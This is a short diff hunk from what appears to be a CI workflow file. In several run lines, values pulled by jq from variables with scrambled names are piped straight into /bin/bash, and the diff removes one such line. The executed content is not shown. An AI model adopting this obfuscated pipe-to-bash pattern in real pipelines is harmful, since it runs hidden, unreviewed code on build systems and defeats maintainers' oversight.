@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$miig39" | jq -r .txmg416 | /bin/bash
           printf '%s' "$qu195" | jq -r .po32276 | /bin/bash
           echo $fkadh071 | jq -r .f0 | /bin/bash
-          printf '%s' "$jy88569" | jq -r .svin8042 | /bin/bash
 
       - name: Archive output
         if: always()
